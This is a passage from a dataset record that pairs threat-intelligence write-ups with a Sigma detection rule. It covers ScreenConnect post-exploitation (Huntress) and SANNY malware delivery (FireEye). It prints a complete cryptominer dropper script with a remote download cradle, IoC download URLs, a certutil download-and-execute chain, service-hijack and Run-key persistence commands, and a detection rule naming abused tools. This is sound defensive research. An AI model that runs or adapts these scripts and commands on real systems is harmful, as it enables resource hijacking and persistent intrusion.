Executable Path, and the Command Line used to execute the PowerShell script. The highlighted command line indicates the execution of a suspicious PowerShell command that bypasses execution policies and runs a specified script.\nTranscription: |\n  Process Details\n  - Parent PID: 14260\n  - PID: 11776\n  - User:\n  - User ID:\n  - Process Name: powershell.exe\n  - Detection Rule: Suspicious Shortened Powershell Arguments via Cmd\n  - Started At: 2024-02-23 04:10:57 UTC\n  - Elevated Access Privileges: False\n  - Executable: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n  - Command Line: powershell.exe -nop -ep bypass -c c:\\perflogs\\RunSchedulerTaskOnce.ps1\n```\n\n*Figure 23: PowerShell execution of malicious script PowerShell script that included an encoded a Driver.dll*\n\nThe script was in fact deleted, but could be partially restored by taking the PowerShell Operational EVTX and running this script, which re-stitched the script back together from its ScriptBlockId (excerpt of script below).\n\n![Figure 24: Extract of  PowerShell code from PowerShell Operational EVTX](src=\"https://cdn.prod.website-files.com/6579dd0b5f9a54376d296939/65d8dc2283ced0c0f2f7407c_3HPJGm39PHTL3QHL4ezuRIOsQaDqAfEbI6gnNMP0bWqjw3ijSNoLXU4mPAj1ipyQOmP_pjWIZvflBmbSkIH5-JDC-mibkCwwwQ3ngNPrFNCrrUqVeONMZxXVEY8LdRdol05FWcBRFnFjCKpJu3mZTIk.png\")\n\n```image\nDescription: The image displays an interface from a decoding tool, illustrating the process of deobfuscating a PowerShell script. It shows a section of encoded text alongside an output pane where the decoded command appears. Key elements visible include a command that removes an item from the PowerShell invocation context, along with various encoded characters and control symbols that represent the structure of the original script. The settings on the left side indicate the parameters for text decoding, such as removing whitespace and specifying the encoding format.\n```\n\n```image\nAlt: Figure 25: Extract of deobfuscated PowerShell code from CyberChef\nDescription: The image displays a screenshot of a code editor interface, showing a portion of deobfuscated PowerShell code. The code includes instructions for loading a .NET assembly and executing a method from a decoded Base64 string. It features a syntax highlighting style with some parts obscured or marked in red, possibly indicating errors or unrecognized characters. The left panel includes a 'Find/Replace' functionality, showcasing a regex search for semicolons and a replacement format.\n```\n\nThis would download a `driver.dll`, and leverage WMI Event Consumer / PwSH persistence (named `System__Cmr`).\n\n![Figure 26: Evidence of the encoded script’s persistence mechanism in the Huntress platform](src=\"https://cdn.prod.website-files.com/6579dd0b5f9a54376d296939/65d8dc7de0dcfe99ffccc017_fuQYbwMC4cOTs9dEkddAD5jg1_K1WB-lbSS9NKgKB4gnl4fxbuX7BRYxgJ15v5K4vC9sFRroJFfEIPdVhO120w7Yho-is6MicU6wqhxgTCfYLjL9qhY4eZEPvdfKXskQi9Wv2XHG-WehjYv_Na6R7-Q.png\")\n\n---\n\n## Wrapping Up\n\nThis incredibly interesting ScreenConnect exploit has enamored many of us at Huntress for the last few days, but it’s a shame our adversaries didn’t commit to pairing this new exploit with new tradecraft.\n\nIt’s worth driving this point home: **most of the post-compromise activities we have documented in this article aren’t novel, original, or outstanding**. Most threat actors simply don’t know what to do beyond the same usual, procedural tradecraft; cybercriminals are rarely sophisticated, and the infosec community can beat them together.\n\nAdversaries will default to their “tried and true” methods. An experienced, talented security team can neutralize most threat actors in the middle of their campaigns with ease. We hope this article inspires your security mindset. If you need any help monitoring for activity related to this vulnerability, you can use Huntress' free trial.\n\nIf you’re interested in more, come and check out the next episode of our Product Lab webinar, where we’ll be sharing even more technical details behind this threat and answer any questions from the community.\n\n---\n\n## Appendix\n\n### ATT&CK\n\n| Tactic              | Technique                                                                                   | Description                                                                                                                                                                      |\n| ------------------- | ------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| Initial Access      | T1190: Exploit Public-Facing Application                                                    | Adversaries are leveraging a path traversal bug and auth bypass in ScreenConnect that allows them to create a privileged account for remote control.                             |\n| Discovery           | T1087: Account Discovery                                                                    | Adversaries are attempting to discover privileged users by running a script across compromised systems.                                                                          |\n| Defense Evasion     | T1562.001: Disable or Modify Tools                                                          | Adversaries are attempting to evade detection by adding exclusion paths to Windows Defender using PowerShell.                                                                    |\n| Defense Evasion     | T1070.001: Clear Windows Event Logs                                                         | Ransomware actors attempt to remove event logs using wevtutil.exe cl command to hinder forensic analysis.                                                                        |\n| Execution           | T1059: Command and Scripting Interpreter                                                    | Adversaries are using PowerShell and CMD to download and execute scripts from remote locations, facilitating various activities such as cryptocurrency mining and remote access. |\n| Persistence         | T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder            | Adversaries stored their MSI ransomware payload in the Public startup folder                                                                                                     |\n| Persistence         | T1136: Create Account                                                                       | Adversaries created new users and in some instances added them to privileged groups.                                                                                             |\n| Persistence         | T1053: Scheduled Task                                                                       | Adversaries are creating scheduled tasks for their cryptominers and remote access                                                                                                |\n| Persistence         | T1546.003: Event Triggered Execution: Windows Management Instrumentation Event Subscription | Adversaries are modifying the registry to achieve persistence by adding WMI Event Consumers.                                                                                     |\n| Persistence         | T1133: External Remote Services                                                             | Adversaries are compromising ScreenConnect instances, deploying SSH tunnels, Chrome remote desktops, and alternate RMMs for evasive, persistent remote access                    |\n| Command and Control | T1105: Ingress Tool Transfer                                                                | Adversaries are downloading files using curl, certutil, and Invoke-WebRequest.                                                                                                   |\n| Command and Control | T1572: Protocol Tunneling                                                                   | Adversaries created SSH tunnels for communication.                                                                                                                               |\n| Impact              | T1496: Resource Hijacking                                                                   | Cryptocurrency miners are being deployed by adversaries                                                                                                                          |\n| Impact              | T1486: Data Encrypted for Impact                                                            | Adversaries deployed ransomware via compromised ScreenConnect                                                                                                                    |\n| Software            | S0154: Cobalt Strike                                                                        | Adversaries are leveraging Cobalt Strike beacons to achieve C2 connections to compromised ScreenConnect machines.                                                                |\n\n### IoCs\n\n| IoC Type                     | Indicator                                                                                            | Hash                                                             |\n| ---------------------------- | ---------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------- |\n| Ransomware                   | C:\\Windows\\TEMP\\ScreenConnect\\22.5.7881.8171\\LB3.exe                                                 | 78a11835b48bbe6a0127b777c0c3cc102e726205f67afefcd82f073e56489e49 |\n| Ransomware                   | http[:]//23.26.137[.]225:8084/msappdata.msi c:\\mpyutd.msi                                            | 8e51de4774d27ad31a83d5df060ba008148665ab9caf6bc889a5e3fba4d7e600 |\n| Ransomware                   | UPX.exe                                                                                              | 2da975fee507060baa1042fb45e8467579abf3f348f1fd37b86bb742db63438a |\n| Ransomware                   | svchost.exe                                                                                          | a50d9954c0a50e5804065a8165b18571048160200249766bfa2f75d03c8cb6d0 |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/GElU1LmvbS/injcet.ps1                                                        | ec49f5033374eb8f533e291111e1433e2da127f45857aebbbe614e711b3ca989 |\n| Cobalt Strike                | hxxp[://]minish[.]wiki[.]gd/c[.]pdfC:\\programdata\\update[.]dat                                       | 0a492d89ea2c05b1724a58dd05b7c4751e1ffdd2eab3a2f6a7ebe65bf3fdd6fe |\n| Cobalt Strike                | C:\\perflogs\\RunSchedulerTaskOnce.ps1                                                                 | 6065fee2d0cb0dc7d0c0788e7e9424088e722dfcf9356d20844d7b2d75b20163 |\n| Cobalt Strike                | copy.exe                                                                                             | 81b4a649a42a157facede979828095ccddcdf6cec47e8a3156530e0c02e9625e |\n| Google Chrome Remote Desktop | https://dl.google.com/edgedl/chrome-remote-desktop/chromeremotedesktophost.msiC:\\\\ProgramData\\\\1.msi | c47bfe3b3eccc86f87d2b6a38f0f39968f6147c2854f51f235454a54e2134265 |\n| SimpleHelp RMM               | https[:]//cmctt.]com/pub/media/wysiwyg/sun.pngC:\\Windows\\spsrv.exe                                   | e8c48250cf7293c95d9af1fb830bb8a5aaf9cfb192d8697d2da729867935c793 |\n| SimpleHelp RMM               | cmctt[.]com/pub/media/wysiwyg/invoke.png                                                             | 37a39fc1feb4b14354c4d4b279ba77ba51e0d413f88e6ab991aad5dd6a9c231b |\n| SimpleHelp RMM               | C:\\\\Users\\\\oldadmin\\\\Documents\\\\Maxx Uptime remote connection\\\\Files\\\\agent.exe                      | a0fd0ceb95e775a48a95c00eab42fa5bb170f552005c38812fd03ab4cc14932e |\n| SimpleHelp RMM               | C:\\\\ProgramData\\\\JWrapper-Remote Access\\\\JWAppsSharedConfig\\\\serviceconfig.xml                       | 2e0df44dd75dbdbd70f1a777178ad8a1867cf0738525508b6120ba21f4505f47 |\n| SimpleHelp RMM IPv4          | 91.92.240[.]71                                                                                       |                                                                  |\n| SSH Script                   | d                                                                                                    | 69c7fc246c4867f070e1a7b80c7c41574ee76ab54a8b543a1e0f20ce4a0d5cde |\n| SSH Script                   | Z.zip                                                                                                | aa9f5ed1eede9aac6d07b0ba13b73185838b159006fa83ed45657d7f333a0efe |\n| Beacon                       | driver.dll                                                                                           | 6e8f83c88a66116e1a7eb10549542890d1910aee0000e3e70f6307aae21f9090 |\n| Unknown                      | 159[.]65[.]130[.]146:4444/svchost.exeC:\\Windows\\Temp\\svchost.exe                                     |                                                                  |\n| Cryptocurrency Miner         | http://185[.]232[.]92[.]32:8888/SentinelUI.exe                                                       |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/s27p8BcTxi/config12[.]json                                                   |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/ojw6aKoA4A/config11[.]json                                                   |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/8l4d5qR39o/config9[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/xkIMWnocQH/config8[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/Db5eUfqKP9/config7[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/L1e30KShXP/config6[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/w2Y0iuEKiY/config5[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/6bkwRh4NXd/config4[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/PRBRzMMEKC/config3[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/RWSn6NLIr7/config2[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/MRFibhy8fS/config1[.]json                                                    |                                                                  |\n| Cryptocurrency Miner         | hxxps[://]transfer[.]sh/FeDRSFU5XV/config[.]json                                                     |                                                                  |\n\n---\n\n### Contents of inject.ps1 - Crypto Currency Miner\n\n```\npowershell -command \\\"iex ((New-Object System.Net.WebClient).DownloadString('https://transfer[.]sh/GElU1LmvbS/injcet.ps1'))\\\"\n\n# Check for Administrator rights\nif (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {\n    Write-Host 'Please Run as Administrator!' -ForegroundColor Red\n    Exit\n}\n# Check and return current user name\n$currentUserName = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name.Split('\\')[1]\n# Paths\n$dircheck = 'C:\\ProgramData\\.logstxt'\n#$filcheck = 'C:\\path\\to\\xmrig.service'  # You might need to adjust this, Windows doesn't have an equivalent to systemd\n$filcheck = 'C:\\Users\\$currentUserName\\rundll32.exe'\n# Removal functions\nif (Test-Path $dircheck) {\n    Remove-Item -Recurse -Force $dircheck\n}\nif (Test-Path $filcheck) {\n    Remove-Item -Force $filcheck\n}\n\n# Download files, I am using ngrok as port forwarding for my containers to FTP server\n$listi = 'https://transfer.sh/UFQTwgYszH/config14.json','https://transfer.sh/ATVMNG5Pbu/config13.json','https://transfer.sh/s27p8BcTxi/config12.json','https://transfer.sh/ojw6aKoA4A/config11.json','https://transfer.sh/lyEkHLGt03/config10.json','https://transfer.sh/8l4d5qR39o/config9.json','https://transfer.sh/xkIMWnocQH/config8.json','https://transfer.sh/Db5eUfqKP9/config7.json','https://transfer.sh/L1e30KShXP/config6.json','https://transfer.sh/w2Y0iuEKiY/config5.json','https://transfer.sh/6bkwRh4NXd/config4.json','https://transfer.sh/PRBRzMMEKC/config3.json','https://transfer.sh/RWSn6NLIr7/config2.json','https://transfer.sh/MRFibhy8fS/config1.json','https://transfer.sh/FeDRSFU5XV/config.json'\n$randconf = Get-Random -InputObject $listi\nInvoke-WebRequest -Uri $randconf -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'config.json'\nInvoke-WebRequest -Uri 'https://transfer.sh/ePlTBkDtz2/rundll32.exe' -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'xmrig.exe'\nInvoke-WebRequest -Uri 'https://transfer.sh/CrNx3LVEgY/nssm.exe' -Headers @{'ngrok-skip-browser-warning'='true'} -OutFile 'nssm.exe'\n\n# Create xmrig service file (assuming this has an equivalent in Windows)\n# TODO: Check if you need an actual service wrapper like NSSM\n\n# Get thread count (using CPU count as a basic substitute for now)\n$threads = (Get-WmiObject -Class Win32_ComputerSystem).NumberOfLogicalProcessors\n$tf = [math]::Round(25 * $threads)\n\n# Move and setup files\nif (-not (Test-Path $dircheck)) {\n    New-Item -ItemType Directory -Path $dircheck\n}\nMove-Item rundll32.exe $dircheck\nMove-Item config.json $dircheck\nMove-Item nssm.exe $dircheck\n# Move-Item xmrig.service C:\\path\\to\\services\\folder  # Adjust path and use only if required\n\n# TODO: Setup as a Windows service (consider tools like NSSM or `sc` command)\n\n#create a nssm command that will make the xmrig.exe run as a service in the background\nSet-Location $dircheck\n.\\nssm install xmrig 'C:\\ProgramData\\.logstxt\\rundll32.exe'\n.\\nssm set xmrig AppDirectory 'C:\\ProgramData\\.logstxt'\n.\\nssm set xmrig AppParameters 'rundll32.exe -B -c config.json' # -B = run the miner in the background\n\n# Start the service\n.\\nssm start xmrig\n\n#make the xmrig service run on startup\n.\\nssm set xmrig start SERVICE_AUTO_START\n\n#make the xmrig write in a log file\n.\\nssm set xmrig AppNoConsole 1\n\n#make the xmrig run in the background\n.\\nssm set xmrig Type SERVICE_WIN32_OWN_PROCESS\n\n\n\n# TODO: Windows doesn't have an equivalent to sysctl or hugepages in the same sense as Linux\n\n# Clean up\nRemove-Item $PSCommandPath -Force\n```",
    "sigma_rule": {
      "title": "Remote Access Tool - ScreenConnect Potential Suspicious Remote Command Execution",
      "id": "7b582f1a-b318-4c6a-bf4e-66fe49bf55a5",
      "related": [
        {
          "id": "d1a401ab-8c47-4e86-a7d8-2460b6a53e4a",
          "type": "derived"
        }
      ],
      "status": "test",
      "description": "Detects potentially suspicious child processes launched via the ScreenConnect client service.\n",
      "references": [
        "https://www.mandiant.com/resources/telegram-malware-iranian-espionage",
        "https://docs.connectwise.com/ConnectWise_Control_Documentation/Get_started/Host_client/View_menu/Backstage_mode",
        "https://www.huntress.com/blog/slashandgrab-screen-connect-post-exploitation-in-the-wild-cve-2024-1709-cve-2024-1708",
        "https://www.trendmicro.com/en_us/research/24/b/threat-actor-groups-including-black-basta-are-exploiting-recent-.html"
      ],
      "author": "Florian Roth (Nextron Systems), Nasreddine Bencherchali (Nextron Systems), @Kostastsale",
      "date": "2022-02-25",
      "modified": "2024-02-28",
      "tags": [
        "attack.command-and-control",
        "attack.t1219"
      ],
      "logsource": {
        "product": "windows",
        "category": "process_creation"
      },
      "detection": {
        "selection": {
          "ParentCommandLine|contains|all": [
            ":\\Windows\\TEMP\\ScreenConnect\\",
            "run.cmd"
          ],
          "Image|endswith": [
            "\\bitsadmin.exe",
            "\\cmd.exe",
            "\\curl.exe",
            "\\dllhost.exe",
            "\\net.exe",
            "\\nltest.exe",
            "\\powershell.exe",
            "\\pwsh.exe",
            "\\rundll32.exe",
            "\\wevtutil.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "If the script being executed make use of any of the utilities mentioned in the detection then they should filtered out or allowed."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\process_creation\\proc_creation_win_remote_access_tools_screenconnect_remote_execution_susp.yml"
  },
  "26": {
    "url": "https://web.archive.org/web/20180331144337/https://www.fireeye.com/blog/threat-research/2018/03/sanny-malware-delivery-method-updated-in-recently-observed-attacks.html",
    "markdown": "# SANNY Malware Delivery Method Updated in Recently Observed Attacks\n\n**March 23, 2018** \n\n### Introduction\n\nIn the third week of March 2018, through FireEye’s Dynamic Threat Intelligence, FireEye discovered malicious macro-based Microsoft Word documents distributing SANNY malware to multiple governments worldwide. Each malicious document lure was crafted in regard to relevant regional geopolitical issues. FireEye has tracked the SANNY malware family since 2012 and believes that it is unique to a group focused on Korean Peninsula issues. This group has consistently targeted diplomatic entities worldwide, primarily using lure documents written in English and Russian.\n\nAs part of these recently observed attacks, the threat actor has made significant changes to their usual malware delivery method. The attack is now carried out in multiple stages, with each stage being downloaded from the attacker’s server. Command line evasion techniques, the capability to infect systems running Windows 10, and use of recent User Account Control (UAC) bypass techniques have also been added.\n\n### Document Details\n\nThe following two documents, detailed below, have been observed in the latest round of attacks:\n\n- **MD5 hash:** c538b2b2628bba25d68ad601e00ad150 \n  **SHA256 hash:** b0f30741a2449f4d8d5ffe4b029a6d3959775818bf2e85bab7fea29bd5acafa4 \n  **Original Filename:** РГНФ 2018-2019.doc\n\n  ```image\n  Alt: Figure 1: Sample document written in Russian\n  Description: The image shows a document written in Russian, titled \"Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект\" (Deepening the Eurasian Geopolitics of China and the Security Interests of Russia: Transport Aspect). It contains sections detailing project information, including project type, knowledge area, classification code, project name, project manager's details, financial information, and keywords. The layout appears to be a formal document, typical of project proposals or scientific research summaries.\n  Transcription: |\n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.\n    \n    Тип проекта: а  \n    Область знания: 07  \n    Код классификатора РГНФ: 07-140  \n    Код ГРНТИ: 73.01.17  \n    Приоритетное направление развития науки, технологий и техники в Российской Федерации, критические технологии]  \n    7. Транспортные и космические системы.\n    \n    Фамилия, имя, отчество руководителя проекта:  \n    Аристова Людмила Борисовна  \n    Телефон руководителя проекта: +7 9858269051  \n    Объем финансирования проекта  \n    на 2017 г.: 500 000 (пятьсот тысяч) рублей  \n    Год начала проекта 2018  \n    Год окончания проекта 2019  \n    Фамилии, имена, отчества основных исполнителей Семенова Н.К.\n    \n    Название проекта  \n    Углубление евразийской геополитики Китая и интересы безопасности России: транспортный аспект.  \n    Тип проекта  \n    а - проект проведения научных исследований, выполняемый научным коллективом или отдельным ученым  \n    Область знания 07  \n    Код классификатора 07-140  \n    Дополнительные коды классификатора (при наличии приводятся дополнительные коды классификатора, к которым может быть отнесен проект) 07-110  \n    \n    Ключевые слова (приводится не более 15 слов)  \n    Экономический пояс Шелкового пути, интересы безопасности РФ, Евразийский экономический союз, интеграция, регионального уровня, перспективы, риски\n  ```\n \n  *Figure 1: Sample document written in Russian*\n\n- **MD5 hash:** 7b0f14d8cd370625aeb8a6af66af28ac \n  **SHA256 hash:** e29fad201feba8bd9385893d3c3db42bba094483a51d17e0217ceb7d3a7c08f1 \n  **Original Filename:** Copy of communication from Security Council Committee (1718).doc\n\n  ```image\n  Alt: Figure 2: Sample document written in English\n  Description: The image displays a document that appears to be a formal letter, likely issued by a committee related to the Security Council. The content includes a header with postal and cable addresses, as well as a reference date of December 8, 2017. The letter discusses humanitarian operations in the Democratic People's Republic of Korea (DPRK) and addresses the unintended consequences of sanctions. Key points of the letter are redacted, indicating sensitive information. Overall, the document serves as an example of a communication that may be associated with the SANNY malware delivery method.\n  Transcription: |\n    POSTAL ADDRESS - ADRESSE POSTALE: <redacted>\n    \n    CABLE ADDRESS - ADRESSE TELEGRAPHIQUE: <redacted>\n    \n    REFERENCE: <redacted> 8 December 2017\n    \n    Dear <redacted>\n    \n    On behalf of the Security Council Committee established pursuant to resolution 1718 (2006), I have the honour to refer to your letter dated 27 October 2017 on the unintended consequences of sanctions on humanitarian operations in the Democratic People’s Republic of Korea (DPRK).\n    \n    The Committee has examined the information contained in your letter and its enclosures, as well as your request for a formal communication from the Committee to all concerned parties reiterating that humanitarian activities are exempt from sanctions. In this regard, I wish to recall that the 1718 Committee has provided exemptions in the past for humanitarian projects, as well as its approval for many other United Nations activities the Committee was consulted on.\n    \n    Similarly, the Committee stands ready to offer its assistance in clarifying to all UN Member States that the sanctions measures imposed by the Security Council resolutions on the DPRK are not intended to have a negative impact on the people of the DPRK.\n  ```\n\n  *Figure 2: Sample document written in English*\n\n### Macro Analysis\n\nIn both documents, an embedded macro stores the malicious command line to be executed in the TextBox property (TextBox1.Text) of the document. This TextBox property is first accessed by the macro to execute the command on the system and is then overwritten to delete evidence of the command line.\n\n```image\nAlt: Macro Code\nDescription: The image displays a snippet of VBA (Visual Basic for Applications) code that demonstrates a macro used in malware delivery. The code retrieves the Windows directory, checks the application path for 'x86', and constructs a command line to execute. It utilizes a TextBox property (TextBox1.Text) to store the command to be executed, which is then run silently (vbHide) and subsequently erases the command from the TextBox to cover its tracks. This code effectively illustrates the method employed by the SANNY malware in recent attacks.\nTranscription: |\n  vb\n  sCmdLine = Environ(\"windir\")\n  nResult = InStr(Application.Path, \"x86\")\n  If nResult <> 0 Then\n      sCmdLine = sCmdLine + \"\\sysnative\\cmd.exe /q /c \"\n  Else\n      sCmdLine = sCmdLine + \"\\system32\\cmd.exe /q /c \"\n  End If\n  \n  sCmdLine = sCmdLine + TextBox1.Text\n  nResult = Shell(sCmdLine, vbHide)\n  TextBox1.Text = \"\"\n  ActiveDocument.Save\n```\n\n### Stage 1: BAT File Download\n\nIn Stage 1, the macro leverages the legitimate Microsoft Windows `certutil.exe` utility to download an encoded Windows Batch (BAT) file from the following URL: `http://more.1apps[.]com/1.txt`. The macro then decodes the encoded file and drops it in the `%temp%` directory with the name: `1.bat`.\n\n```image\nAlt: Stage 1 Code\nDescription: The image displays a command line snippet showing the execution of a BAT file download and decoding process using the Microsoft Windows `certutil.exe` utility. It outlines a series of commands where `certutil.exe` is copied to a temporary directory and executed to download an encoded BAT file from a specified URL. The command also includes steps for decoding the file and deleting the original text file after extraction.\nTranscription: |\n  C:\\Windows\\system32\\cmd.exe /q /c copy /Y\n  %windir%\\System32\\certutil.exe %TEMP%\\ct.exe && cd /d\n  %TEMP% && ct -urlcache -split -f\n  http://more.1apps.com/1.txt && ct -decode -f 1.txt\n  1.bat && del /f /q 1.txt && 1.bat\n```\n\nThere were a few interesting observations in the command line:\n\n1. The macro copies the Microsoft Windows `certutil.exe` utility to the `%temp%` directory with the name: `ct.exe`. One of the reasons for this is to evade detection by security products. Recently, FireEye has observed other threat actors using `certutil.exe` for malicious purposes. By renaming `certutil.exe` before execution, the malware authors are attempting to evade simple file-name based heuristic detections.\n2. The malicious BAT file is stored as the contents of a fake PEM encoded SSL certificate (with the BEGIN and END markers) on the Stage 1 URL, as shown in Figure 3. The `certutil.exe` utility is then leveraged to both strip the BEGIN/END markers and decode the Base64 contents of the file. FireEye has not previously observed the malware authors use this technique in past campaigns.\n\n```image\nAlt: Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate\nDescription: The image depicts a text-based representation of a malicious BAT file, formatted to resemble a PEM encoded SSL certificate. It includes the markers 'BEGIN CERTIFICATE' and 'END CERTIFICATE', with the encoded content in between. This format is used to disguise the BAT file to evade detection, and is part of a cyber attack strategy involving the SANNY malware.\nTranscription: |\n  -----BEGIN CERTIFICATE-----\n  QGVjaG9pb2ZmQ0NlcmIxIG5vdCBleGlzdCBleGlzdCB0aGVJVSBTdG9QS1UgSUxFUyh4ODYpJSIg\n  KA0KCWh0dCI6ICJjYWNoZSAtd3d3Lm9hcGVuLm9yZyBtb3RoZXIgYmluZGluZyBhcHBsaWNhdGlv\n  bnMgYnVnLC4gICBidWcgYWNjaGVzIGJla2F1c2UgdGhleSBhcmUgY29tcGxleCBhbmQgdGhleSBh\n  cmUgYm91bmQgdG8gZnJlcXVlbnQgdXBkYXRlcy4gICBIZXJlIGlzIGFuIGV4YW1wbGUgb2YgYSBz\n  aW1wbGUgY2VydGlmaWNhdGUgdGhhdCBjb3VsZCBiZSB1c2VkIGZvciBhIGJyb3dzZXIgcGx1Z2lu\n  ...\n```\n\n*Figure 3: Malicious BAT file stored as an encoded file to appear as an SSL certificate*\n\n### BAT File Analysis\n\nOnce decoded and executed, the BAT file from Stage 1 will download an encoded CAB file from the base URL: `hxxp://more.1apps[.]com/`. The exact file name downloaded is based on the architecture of the operating system.\n\n- For a 32-bit operating system: `hxxp://more.1apps[.]com/2.txt`\n- For a 64-bit operating system: `hxxp://more.1apps[.]com/3.txt`\n\nSimilarly, based on Windows operating system version and architecture, the CAB file is installed using different techniques. For Windows 10, the BAT file uses `rundll32` to invoke the appropriate function from `update.dll` (component inside `setup.cab`).\n\n- For a 32-bit operating system: `rundll32 update.dll _EntryPoint@16`\n- For a 64-bit operating system: `rundll32 update.dll EntryPoint`\n\nFor other versions of Windows, the CAB file is extracted using the legitimate Windows Update Standalone Installer (`wusa.exe`) directly into the system directory:\n\n```image\nAlt: CAB File Installation Code\nDescription: |\n  The image depicts a snippet of code related to the installation of a CAB file using the Windows Update Standalone Installer (wusa.exe). It includes commands for quiet extraction of the CAB file, deletion of the setup file, and other command-line instructions, which are part of a malware delivery method associated with SANNY malware. The specific commands shown are \n  - 'wusa setup.cab /quiet /extract:%windir%\\System32 > nul' \n  - 'del /f /q setup.cab > nul' \n  - 'cliconfg' \n  - 'goto EXIT'.\nTranscription: |\n  plaintext\n  wusa setup.cab /quiet /extract:%windir%\\System32 > nul\n  del /f /q setup.cab > nul\n  cliconfg\n  goto EXIT\n```\n\nThe BAT file also checks for the presence of Kaspersky Lab Antivirus software on the machine. If found, CAB installation is changed accordingly in an attempt to bypass detection:\n\n```image\nAlt: Kaspersky Detection Code\nDescription: The image displays a snippet of code related to the installation process of a CAB file used in SANNY malware. It includes commands for setting a path, expanding the CAB file, deleting the original CAB file, adding a registry entry for the malware to run at startup, and invoking the 'rundll32' command to execute a DLL file. The code is formatted in a monospaced font, indicating its function as a script, and highlights key commands that illustrate the malware's behavior during installation.\nTranscription: |\n  set sPath=%LOCALAPPDATA%\\Microsoft\\Office\n  expand setup.cab -F:ipnet.* %sPath% > nul\n  del /f /q setup.cab > nul\n  reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t\n  REG_SZ /d \"rundll32 %sPath%\\ipnet.dll ServiceMain\" /f > nul\n  rundll32 %sPath%\\ipnet.dll ServiceMain\n  goto EXIT\n```\n\n### Stage 2: CAB File Analysis\n\nAs described in the previous section, the BAT file will download the CAB file based on the architecture of the underlying operating system. The rest of the malicious activities are performed by the downloaded CAB file.\n\nThe CAB file contains the following components:\n\n- `install.bat` – BAT file used to deploy and execute the components.\n- `ipnet.dll` – Main component that we refer to as SANNY malware.\n- `ipnet.ini` – Config file used by SANNY malware.\n- `NTWDBLIB.dll` – Performs UAC bypass on Windows 7 (32-bit and 64-bit).\n- `update.dll` – Performs UAC bypass on Windows 10.\n\n`install.bat` will perform the following essential activities:\n\n1. Checks the current execution directory of the BAT file. If it is not the Windows system directory, then it will first copy the necessary components (`ipnet.dll` and `ipnet.ini`) to the Windows system directory before continuing execution:\n\n   ```image\n   Alt: Install.bat Code\n   Description: The image depicts a portion of code from a BAT file used in the SANNY malware delivery method. It includes commands that check if the current execution directory is the Windows system directory and conditionally copy two files, 'ipnet.dll' and 'ipnet.ini', to the System32 directory. The code also contains commands for deleting the original files after the copy operation, indicating the malicious intent of the script.\n   Transcription: |\n     batch\n     echo %~dp0 | findstr /i \"system32\" > nul\n     IF %ERRORLEVEL% EQU 0 (GOTO INSTALL) ELSE (GOTO COPYFILE)\n     \n     :COPYFILE\n     copy /y %~dp0\\ipnet.dll %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.dll > nul\n     \n     copy /y %~dp0\\ipnet.ini %windir%\\System32 > nul\n     del /f /q %~dp0\\ipnet.ini > nul\n   ```\n\n2. Hijacks a legitimate Windows system service, `COMSysApp` (COM+ System Application) by first stopping this service, and then modifying the appropriate Windows service registry keys to ensure that the malicious `ipnet.dll` will be loaded when the `COMSysApp` service is started:\n\n   ```image\n   Alt: Service Hijacking Code\n   Description: The image displays a code snippet related to the installation and configuration of a Windows service called `COMSysApp`. It includes commands for stopping the service, configuring it to run with a specific executable path (pointing to `svchost.exe`), and adding registry entries to ensure the malicious `ipnet.dll` is used as the service's dynamic link library (DLL). The commands indicate actions taken to hijack the legitimate service for malicious purposes.\n   Transcription: |\n     :INSTALL\n     sc stop COMSysApp > nul\n     sc config COMSysApp type= own start= auto error= normal binpath= \"%windir%\\System32\\svchost.exe -k COMSysApp\" > nul\n     reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost\" /v COMSysApp /t REG_MULTI_SZ /d \"COMSysApp\" /f > nul\n     reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\COMSysApp\\Parameters\" /v ServiceDll /t REG_EXPAND_SZ /d \"%windir%\\System32\\ipnet.dll\" /f > nul\n     sc start COMSysApp > nul\n   ```\n\n3. After the hijacked `COMSysApp` service is started, it will delete all remaining components of the CAB file:\n\n   ```image\n   Alt: Component Deletion Code\n   Description: The image displays a segment of code, specifically command-line instructions related to the deletion of certain files in a Windows environment. It includes commands that use the 'del' function to remove files such as 'NTWDBLIB.dll', 'update.dll', 'dummy.dll', and 'uacme.exe' from the system. The output redirection to 'nul' suggests that any output from these commands will be suppressed, indicating a stealthy approach to file deletion, which is often used in malware operations.\n   Transcription: |\n     del /f /q %~dp0\\NTWDBLIB.dll > nul\n     del /f /q %~dp0\\update.dll > nul\n     del /f /q %~dp0\\dummy.dll > nul\n     del /f /q %~dp0\\uacme.exe > nul\n   ```\n\n`ipnet.dll` is the main component inside the 